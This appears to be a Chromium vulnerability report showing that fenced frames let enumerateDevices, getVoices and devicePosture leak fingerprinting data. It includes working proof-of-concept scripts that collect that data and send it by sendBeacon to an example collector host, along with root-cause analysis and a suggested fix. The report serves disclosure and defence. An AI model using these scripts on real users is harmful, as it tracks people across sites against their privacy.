# Fenced Frame Privacy Bypass: Multiple APIs Leak Fingerprinting Data

## Summary

Multiple Web APIs are accessible from Fenced Frames with plain JavaScript and without any permission grant, leaking device fingerprinting data that can be exfiltrated via allowed channels (sendBeacon). This defeats the privacy guarantee that Fenced Frames are designed to provide in the Protected Audience API.

## Affected Version

Chromium trunk (tested via source audit)

## Steps to Reproduce

### Test 1: enumerateDevices() from Fenced Frame

```html
<!-- Host page (https://publisher.example/) -->
<fencedframe src="https://ad.example/frame.html" mode="opaque-ads"></fencedframe>
```

```html
<!-- frame.html served inside fenced frame (https://ad.example/) -->
<script>
(async () => {
  const devices = await navigator.mediaDevices.enumerateDevices();
  // Returns device count and hashed IDs without any permission
  const fingerprint = {
    count: devices.length,
    kinds: devices.map(d => d.kind),
    groupIds: devices.map(d => d.groupId)
  };
  // Exfiltrate via allowed channel
  navigator.sendBeacon('https://ad.example/collect', JSON.stringify(fingerprint));
})();
</script>
```

### Test 2: getVoices() from Fenced Frame

```html
<!-- Inside fenced frame -->
<script>
speechSynthesis.addEventListener('voiceschanged', () => {
  const voices = speechSynthesis.getVoices();
  const fingerprint = voices.map(v => v.name + ':' + v.lang + ':' + v.localService).join('|');
  navigator.sendBeacon('https://ad.example/collect', fingerprint);
});
</script>
```

### Test 3: devicePosture from Fenced Frame

```html
<!-- Inside fenced frame -->
<script>
const posture = navigator.devicePosture.type;
navigator.sendBeacon('https://ad.example/collect?posture=' + posture);
navigator.devicePosture.addEventListener('change', () => {
  navigator.sendBeacon('https://ad.example/collect?posture=' + navigator.devicePosture.type);
});
</script>
```

## Root Cause

Fenced frames restrict API access through three mechanisms:
1. **Browser-side `IsNestedWithinFencedFrame()` checks** — Only a few APIs implement this (BatteryMonitor, ComputePressure, Bluetooth, HID, Serial, etc.)
2. **Permissions Policy via `kFencedFrameAllowedFeatures`** — Only allows kPrivateAggregation, kSharedStorage, kSharedStorageSelectUrl
3. **Permission prompts blocked by `PermissionControllerImpl`** — APIs requiring user permission grants are blocked

APIs that bypass all three layers are accessible from fenced frames:
- `navigator.mediaDevices.enumerateDevices()` — No PP check, no fenced frame check, no permission needed for device count/IDs
- `speechSynthesis.getVoices()` — No PP check, no fenced frame check, no permission needed
- `navigator.devicePosture` — No PP check, no fenced frame check
- `EyeDropper` — No fenced frame check (requires user activation only)
- `navigator.mediaSession` — No fenced frame check

**Relevant code:**
- `content/browser/browser_interface_binders.cc` — None of these Mojo bindings check `IsNestedWithinFencedFrame()`
- `third_party/blink/public/common/frame/fenced_frame_sandbox_flags.h` — Sandbox flags don't cover API access
- `blink/common/permissions_policy/permissions_policy.cc` — `kFencedFrameAllowedFeatures` list is too narrow

## Security Impact

**Privacy bypass**: Fenced frames exist to provide a privacy-preserving container for ads served via the Protected Audience API (FLEDGE). The design goal is to prevent the ad content from correlating users across sites. By fingerprinting the user's device configuration (device count, voice list, device posture), an ad tech company can build a cross-site identifier that defeats this protection.

**Fingerprinting entropy estimation:**
- `enumerateDevices()`: device count alone provides ~3-5 bits of entropy; combined with groupId values, significantly more
- `getVoices()`: voice list typically provides 10-20+ bits of entropy (varies by OS, installed language packs)
- `devicePosture`: 1 bit (continuous vs folded), but reveals physical device type

Combined, these provide a strong cross-site fingerprint that persists across different fenced frame instances.

**Data exfiltration**: `sendBeacon` and `fetch` to the ad's own origin are allowed by fenced frame design, so the fingerprint can be trivially exfiltrated.

## Suggested Fix

Add `IsNestedWithinFencedFrame()` checks to the browser-side Mojo bindings for:
1. `MediaDevicesDispatcherHost` — Block or return empty device list for fenced frames
2. `SpeechSynthesis` — Block `getVoices()` for fenced frames
3. `DevicePostureProvider` — Block for fenced frames
4. `EyeDropperChooser` — Block for fenced frames (also a cross-boundary visual info leak)
5. `MediaSessionService` — Block for fenced frames

Alternatively, extend `kFencedFrameAllowedFeatures` enforcement to cover these APIs via Permissions Policy.
